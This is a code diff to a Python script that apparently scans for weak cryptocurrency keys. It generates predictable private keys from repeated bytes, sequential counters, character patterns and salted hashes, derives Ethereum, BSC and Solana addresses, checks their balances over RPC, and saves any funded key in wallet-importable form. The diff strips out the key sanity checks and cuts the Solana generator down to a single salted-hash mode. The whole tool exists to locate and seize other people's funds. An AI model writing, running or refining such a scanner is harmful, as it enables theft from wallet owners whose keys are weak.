@@ -8,7 +8,6 @@ import os
 import sys
 import time
 import threading
-import traceback
 import asyncio
 import hashlib
 from concurrent.futures import ThreadPoolExecutor
@@ -79,66 +78,27 @@ def append_found_line_by_line(chain, privhex, address, balance_str):
             f.write(f"BALANCE: {balance_str}\n")
             f.write("="*60 + "\n")
 
-def format_found_block(chain, privhex, address, balance_str):
-    border = "=" * 60
-    return "\n".join([
-        border,
-        f"CHAIN: {chain}",
-        f"PRIVATE_KEY: {privhex}",
-        f"ADDRESS: {address}",
-        f"BALANCE: {balance_str}",
-        border
-    ])
-
 SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
 
-# ---------------- Generators state ----------------
-# Counters & generator indices
+# ---------------- Ethereum/BSC Generators ----------------
 sequential_counter_eth = 0
-sequential_counter_solana = 0
-
 repetitive_patterns = [b'a', b'b', b'c', b'd', b'e', b'f', b'1', b'2', b'3', b'4']
 repetitive_index_eth = 0
-repetitive_index_solana = 0
-
 MIXED_PATTERNS = b'abcdefghijklmnopqrstuvwxyz0123456789'
 mixed_index_eth = 0
-mixed_index_solana = 0
-
-# New: hashed deterministic seeds for Solana
-# Default salt (you can override with --solana-salt): choose anything
-DEFAULT_SOLANA_SALT = b"scanner-salt-v1"  
-
-hashed_index_solana = 0
-
-# mode-cycle: order in which generators are used for each worker
-# Note: 'hashed' is included for Solana (and prioritized by default for Solana usage).
 GENERATOR_MODES = ['repetitive', 'sequential', 'mixed']  # user-overridable
 mode_index_eth = 0
-mode_index_solana = 0
 
-# ---------------- Generators ----------------
 def gen_repetitive_eth():
     global repetitive_index_eth
     letter = repetitive_patterns[repetitive_index_eth % len(repetitive_patterns)]
     repetitive_index_eth += 1
     return letter * 32
 
-def gen_repetitive_solana():
-    global repetitive_index_solana
-    letter = repetitive_patterns[repetitive_index_solana % len(repetitive_patterns)]
-    repetitive_index_solana += 1
-    return letter * 32
-
 def gen_sequential_numeric_eth():
     global sequential_counter_eth
     sequential_counter_eth += 1
     return sequential_counter_eth.to_bytes(32, "big", signed=False)
-
-def gen_sequential_numeric_solana():
-    global sequential_counter_solana
-    sequential_counter_solana += 1
-    return sequential_counter_solana.to_bytes(32, "big", signed=False)
 
 def gen_mixed_sequence_eth():
     global mixed_index_eth
@@ -148,30 +108,6 @@ def gen_mixed_sequence_eth():
     mixed_index_eth += 1
     return bytes(key)
 
-def gen_mixed_sequence_solana():
-    global mixed_index_solana
-    seed = bytearray(32)
-    for i in range(32):
-        seed[i] = MIXED_PATTERNS[(mixed_index_solana + i) % len(MIXED_PATTERNS)]
-    mixed_index_solana += 1
-    return bytes(seed)
-
-# New: deterministic hashed seed for Solana (predictable but high-entropy-looking)
-def gen_hashed_solana(salt: bytes):
-    """Return a function that when called yields next 32-byte SHA256(salt || counter)."""
-    global hashed_index_solana
-    def _gen():
-        global hashed_index_solana
-        # Use an 8-byte counter concatenated with salt; then SHA256 => 32 bytes
-        counter_bytes = hashed_index_solana.to_bytes(8, "big")
-        hashed_index_solana += 1
-        h = hashlib.sha256()
-        h.update(salt)
-        h.update(counter_bytes)
-        return h.digest()
-    return _gen
-
-# Wrapper functions
 def gen_eth_privkey_bytes():
     global mode_index_eth
     mode = GENERATOR_MODES[mode_index_eth % len(GENERATOR_MODES)]
@@ -185,46 +121,29 @@ def gen_eth_privkey_bytes():
     else:
         return gen_sequential_numeric_eth()
 
-# gen_solana_keypair will accept a generator function for hashed mode
-# For simplicity, we will build a dictionary mapping modes -> generator function
-# and include 'hashed' when configured.
-def make_solana_generators(salt: bytes):
-    gens = {
-        'repetitive': gen_repetitive_solana,
-        'sequential': gen_sequential_numeric_solana,
-        'mixed': gen_mixed_sequence_solana,
-        'hashed': gen_hashed_solana(salt)
-    }
-    return gens
+# ---------------- Simplified deterministic Solana generator ----------------
+hashed_index_solana = 0
+DEFAULT_SOLANA_SALT = b"scanner-salt-v1"  
 
-# Keep a slot for the active solana generators (populated in main)
-_SOL_GENS = None
+def gen_hashed_solana_seed(salt: bytes):
+    """Return a 32-byte deterministic SHA256(salt || counter) seed."""
+    global hashed_index_solana
+    counter_bytes = hashed_index_solana.to_bytes(8, "big")
+    hashed_index_solana += 1
+    h = hashlib.sha256()
+    h.update(salt)
+    h.update(counter_bytes)
+    return h.digest()
 
-def gen_solana_keypair():
-    """Cycle through solana generators (including hashed) and return (seed, address)."""
-    global mode_index_solana, _SOL_GENS
-    if _SOL_GENS is None:
-        # fallback: hashed with default salt
-        _SOL_GENS = make_solana_generators(DEFAULT_SOLANA_SALT)
-    modes = list(_SOL_GENS.keys())
-    # preserve user ordering by picking from GENERATOR_MODES if present, else modes list
-    mode_cycle = GENERATOR_MODES if 'hashed' in GENERATOR_MODES else list(_SOL_GENS.keys())
-    mode = mode_cycle[mode_index_solana % len(mode_cycle)]
-    mode_index_solana += 1
-
-    gen_fn = _SOL_GENS.get(mode)
-    if gen_fn is None:
-        gen_fn = _SOL_GENS['sequential']
-    seed = gen_fn()
-
-    if ed25519_mod is None:
-        raise RuntimeError("ed25519 module not available — please install it with: pip install ed25519")
-
+def gen_solana_keypair_direct(salt: bytes):
+    """Generate seed + address in one deterministic step."""
+    seed = gen_hashed_solana_seed(salt)
     sk = ed25519_mod.SigningKey(seed)
     vk = sk.get_verifying_key()
-    pub_raw = vk.to_bytes() if hasattr(vk, "to_bytes") else bytes(vk)
-    address = base58.b58encode(pub_raw).decode()
-    return seed, address
+    pub_bytes = vk.to_bytes() if hasattr(vk, "to_bytes") else bytes(vk)
+    address = base58.b58encode(pub_bytes).decode()
+    full_sk_bytes = seed + pub_bytes  # 64 bytes, wallet-importable
+    return full_sk_bytes.hex(), address
 
 # ---------------- Address derivation ----------------
 def eth_priv_to_address(priv_bytes: bytes) -> str:
@@ -236,41 +155,6 @@ def eth_priv_to_address(priv_bytes: bytes) -> str:
 
 def bsc_priv_to_address(priv_bytes: bytes) -> str:
     return eth_priv_to_address(priv_bytes)
-
-# ---------------- Sanity checks ----------------
-def sanity_check_secp256k1_privkey(priv_bytes: bytes) -> bool:
-    try:
-        if not isinstance(priv_bytes, (bytes, bytearray)) or len(priv_bytes) != 32:
-            return False
-        priv_int = int.from_bytes(priv_bytes, "big")
-        if not (1 <= priv_int < SECP256K1_N):
-            return False
-        s = set(priv_bytes)
-        if len(s) <= 1:
-            return False
-        return True
-    except Exception:
-        return False
-
-def sanity_check_ed25519_seed(seed: bytes) -> bool:
-    try:
-        if not isinstance(seed, (bytes, bytearray)) or len(seed) != 32:
-            return False
-        s = set(seed)
-        if len(s) <= 1:
-            return False
-        if ed25519_mod is None:
-            return True
-        sk = ed25519_mod.SigningKey(seed)
-        vk = sk.get_verifying_key()
-        pub_raw = vk.to_bytes() if hasattr(vk, "to_bytes") else bytes(vk)
-        if not isinstance(pub_raw, (bytes, bytearray)) or len(pub_raw) != 32:
-            return False
-        if set(pub_raw) == {0}:
-            return False
-        return True
-    except Exception:
-        return False
 
 # ---------------- RPC helpers ----------------
 async def rpc_post_with_retries(url: str, json_payload: dict, session: aiohttp.ClientSession, debug: bool=False, max_attempts: int=3):
@@ -316,11 +200,6 @@ async def worker_eth_async(chain_name, rpc_url, debug=False):
         while not stop_event.is_set():
             try:
                 priv = gen_eth_privkey_bytes()
-                if not sanity_check_secp256k1_privkey(priv):
-                    if debug:
-                        print(f"[{chain_name}][sanity] rejected priv (failed sanity): {priv.hex()}")
-                    await asyncio.sleep(0.05)
-                    continue
                 privhex = priv.hex()
                 key_repr = f"{chain_name}:{privhex}"
                 if key_repr in in_memory_tried:
@@ -350,43 +229,22 @@ async def worker_eth_async(chain_name, rpc_url, debug=False):
 async def worker_bsc_async(chain_name, rpc_url, debug=False):
     await worker_eth_async(chain_name, rpc_url, debug=debug)
 
-async def worker_solana_async(chain_name, rpc_url, debug=False):
+async def worker_solana_async(chain_name, rpc_url, salt_bytes, debug=False):
     timeout = aiohttp.ClientTimeout(total=30)
     async with aiohttp.ClientSession(timeout=timeout) as session:
         while not stop_event.is_set():
             try:
-                # generate seed/address (gen_solana_keypair cycles through configured modes)
-                try:
-                    seed, address = gen_solana_keypair()
-                except RuntimeError as e:
-                    if debug:
-                        print(f"[{chain_name}][error] {e}")
-                    await asyncio.sleep(1.0)
-                    continue
-
-                if not sanity_check_ed25519_seed(seed):
-                    if debug:
-                        print(f"[{chain_name}][sanity] rejected seed (failed sanity): {seed.hex()}")
-                    await asyncio.sleep(0.05)
-                    continue
-
-                seed_hex_for_tried = seed.hex()
-                key_repr = f"{chain_name}:{seed_hex_for_tried}"
+                full_privhex, address = gen_solana_keypair_direct(salt_bytes)
+                key_repr = f"{chain_name}:{full_privhex}"
                 if key_repr in in_memory_tried:
                     if debug:
-                        print(f"[{chain_name}] duplicate seed, skipping {seed_hex_for_tried}")
+                        print(f"[{chain_name}] duplicate seed, skipping {full_privhex[:16]}...")
                     await asyncio.sleep(0.02)
                     continue
                 append_tried(key_repr)
 
-                # Derive full 64-byte secret key = seed + pubkey (wallet-importable)
-                sk = ed25519_mod.SigningKey(seed)
-                vk = sk.get_verifying_key()
-                pub_bytes = vk.to_bytes() if hasattr(vk, "to_bytes") else bytes(vk)
-                full_sk_bytes = seed + pub_bytes  # 64 bytes
-                full_privhex = full_sk_bytes.hex()
                 if debug:
-                    print(f"[{chain_name}] trying seed={seed.hex()} -> addr={address}")
+                    print(f"[{chain_name}] trying priv={full_privhex[:16]}... -> addr={address}")
 
                 try:
                     lamports = await solana_get_balance(rpc_url, address, session, debug=debug)
@@ -413,22 +271,13 @@ def run_async_worker(coro_func, *args, **kwargs):
 def main():
     parser = ArgumentParser()
     parser.add_argument("-d", "--debug", action="store_true", help="Enable debug output")
-    parser.add_argument("--modes", nargs="+", choices=['repetitive','sequential','mixed','hashed'],
-                        help="Override generator modes and order (space-separated). Include 'hashed' for solana-safe seeds.")
     parser.add_argument("--solana-salt", type=str, default=DEFAULT_SOLANA_SALT.decode(),
                         help="Salt used for deterministic hashed Solana seeds (default: 'scanner-salt-v1')")
     args = parser.parse_args()
     debug = args.debug
-
-    global GENERATOR_MODES, _SOL_GENS
-    if args.modes:
-        GENERATOR_MODES = args.modes
-
-    # prepare solana generators with provided salt
     salt_bytes = args.solana_salt.encode()
-    _SOL_GENS = make_solana_generators(salt_bytes)
 
-    print(f"[info] Starting scanner. Debug={debug}. Modes={GENERATOR_MODES}. Solana-salt={args.solana_salt}. Press Ctrl+C to stop.")
+    print(f"[info] Starting scanner. Debug={debug}. Solana-salt={args.solana_salt}. Press Ctrl+C to stop.")
 
     open(TRIED_FILE, "a").close()
     open(FOUND_FILE, "a").close()
@@ -437,7 +286,7 @@ def main():
         futures = []
         futures.append(ex.submit(run_async_worker, worker_eth_async, "ethereum", ETH_RPC, debug))
         futures.append(ex.submit(run_async_worker, worker_bsc_async, "bsc", BSC_RPC, debug))
-        futures.append(ex.submit(run_async_worker, worker_solana_async, "solana", SOL_RPC, debug))
+        futures.append(ex.submit(run_async_worker, worker_solana_async, "solana", SOL_RPC, salt_bytes, debug))
         try:
             while not stop_event.is_set():
                 time.sleep(0.5)
